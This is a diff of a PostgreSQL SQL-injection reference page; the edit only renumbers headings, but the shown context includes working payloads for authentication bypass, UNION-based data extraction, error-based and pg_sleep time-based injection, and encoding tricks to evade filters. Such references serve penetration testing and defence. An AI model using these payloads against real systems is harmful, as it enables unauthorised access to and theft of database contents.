@@ -7,11 +7,9 @@ tags: ["constants", "literals", "reference"]
 lastUpdated: 2025-12-14
 ---
 
-## Constants
-
 PostgreSQL supports various types of constants (literals) that can be valuable in SQL injection attacks. Understanding these constants helps in crafting more effective payloads and bypassing certain filters.
 
-### Numeric Constants
+## Numeric Constants
 
 PostgreSQL supports several formats for numeric literals:
 
@@ -29,7 +27,7 @@ PostgreSQL supports several formats for numeric literals:
 
 **Note:** For PostgreSQL versions before 16, use decimal literals or cast from hex strings: `x'FF'::int` or `('\xFF')::bytea`. Bytea hex input uses the `'\x...'::bytea` form, not `0x`.
 
-### String Constants
+## String Constants
 
 String literals can be represented in several ways:
 
@@ -42,7 +40,7 @@ String literals can be represented in several ways:
 | Unicode String | `U&'\0041'`      | Unicode escape (letter A)            |
 | Hex Bytea      | `'\x48454C4C4F'` | Bytea hex format                     |
 
-### Dollar-Quoted Strings
+## Dollar-Quoted Strings
 
 Dollar quoting is unique to PostgreSQL and extremely useful for injection:
 
@@ -57,7 +55,7 @@ SELECT $x$admin$x$;
 SELECT $outer$This contains $$inner$$ quotes$outer$;
 ```
 
-### Temporal Constants
+## Temporal Constants
 
 Date and time constants:
 
@@ -68,7 +66,7 @@ Date and time constants:
 | Timestamp | `'2025-03-15 15:30:45'` | YYYY-MM-DD HH:MM:SS format |
 | Interval  | `INTERVAL '1 day'`      | Time interval              |
 
-### Special Constants
+## Special Constants
 
 PostgreSQL has several special values:
 
@@ -82,7 +80,7 @@ PostgreSQL has several special values:
 | `LOCALTIME`         | Current time without timezone        |
 | `LOCALTIMESTAMP`    | Current timestamp without timezone   |
 
-### System Information Functions
+## System Information Functions
 
 PostgreSQL uses functions rather than `@@` variables for system info:
 
@@ -97,7 +95,7 @@ PostgreSQL uses functions rather than `@@` variables for system info:
 | `inet_server_port()`         | Server port           | `5432`                |
 | `pg_postmaster_start_time()` | Server start time     | `2025-01-01 00:00:00` |
 
-### Configuration Settings
+## Configuration Settings
 
 Access configuration via `current_setting()`:
 
@@ -110,7 +108,7 @@ SELECT current_setting('server_version');    -- 15.4
 SELECT current_setting('port');              -- 5432
 ```
 
-### Boolean Expressions
+## Boolean Expressions
 
 Boolean expressions evaluate to true or false:
 
@@ -123,11 +121,11 @@ Boolean expressions evaluate to true or false:
 | `true AND true`    | true   |
 | `true OR false`    | true   |
 
-### Using Constants in SQL Injection
+## Using Constants in SQL Injection
 
 **Important:** The techniques below are environment- and configuration-dependent. Factors affecting success include PostgreSQL version, installed extensions, input sanitization/WAF rules, role privileges, and server encoding settings. Always validate prerequisites before attempting these techniques. See also: [Privileges](/postgresql/privileges) and [Command Execution](/postgresql/command-execution) for permission requirements.
 
-#### Dollar Quote Bypasses
+### Dollar Quote Bypasses
 
 **Caveat:** Dollar-quoting may be blocked by input sanitizers or strict SQL parsers that don't expect this syntax.
 
@@ -139,7 +137,7 @@ Boolean expressions evaluate to true or false:
 ' UNION SELECT $x$injected$x$, 2 --
 ```
 
-#### Numeric Constants in Bypasses
+### Numeric Constants in Bypasses
 
 **Caveat:** The `::` casting shorthand is PostgreSQL-specific and may be blocked by sanitizers expecting standard SQL syntax.
 
@@ -154,7 +152,7 @@ Boolean expressions evaluate to true or false:
 ' OR 1::boolean --
 ```
 
-#### String Encoding Bypasses
+### String Encoding Bypasses
 
 **Caveat:** `CHR()` and `convert_from()` require those functions to be available (standard in PostgreSQL). Escape string syntax (`E'...'`) and encoding conversions depend on server encoding settings (typically UTF8).
 
@@ -169,9 +167,9 @@ SELECT E'\x61\x64\x6d\x69\x6e';  -- 'admin'
 SELECT convert_from('\x61646d696e', 'UTF8');  -- 'admin'
 ```
 
-#### Practical Applications
+### Practical Applications
 
-##### Using Boolean Constants
+#### Using Boolean Constants
 
 ```sql
 -- Simple authentication bypass
@@ -180,7 +178,7 @@ SELECT convert_from('\x61646d696e', 'UTF8');  -- 'admin'
 ' OR NOT false --
 ```
 
-##### Using System Functions
+#### Using System Functions
 
 **Note:** Some system functions and settings require elevated privileges. Functions like `current_setting('data_directory')` may be restricted to superusers or specific roles, and settings such as `restrict_superuser_variables` (PostgreSQL 15+) can further limit access. UNION-based injections also require matching column counts and compatible data types. Validate the DB user's privilege level and test prerequisites before attempting these techniques.
 
@@ -192,7 +190,7 @@ SELECT convert_from('\x61646d696e', 'UTF8');  -- 'admin'
 ' UNION SELECT current_setting('data_directory'), 2 --
 ```
 
-### Error-Based Injection with Constants
+## Error-Based Injection with Constants
 
 **Caveat:** Error-based techniques require verbose error messages to be returned to the client (not always enabled in production). The `::` casting shorthand is PostgreSQL-specific.
 
@@ -204,7 +202,7 @@ SELECT convert_from('\x61646d696e', 'UTF8');  -- 'admin'
 ' AND version()::int=1 --
 ```
 
-### Constants in Time-Based Attacks
+## Constants in Time-Based Attacks
 
 **Caveat:** `pg_sleep()` is generally available to all roles by default, but may be restricted by `statement_timeout`, connection poolers, or security policies. High sleep values may trigger timeouts or monitoring alerts.
 
@@ -216,7 +214,7 @@ SELECT convert_from('\x61646d696e', 'UTF8');  -- 'admin'
 ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
 ```
 
-### Limitations and Considerations
+## Limitations and Considerations
 
 1. Dollar-quoted strings are PostgreSQL-specific and won't work in other databases
 2. PostgreSQL is stricter about type casting than MySQL
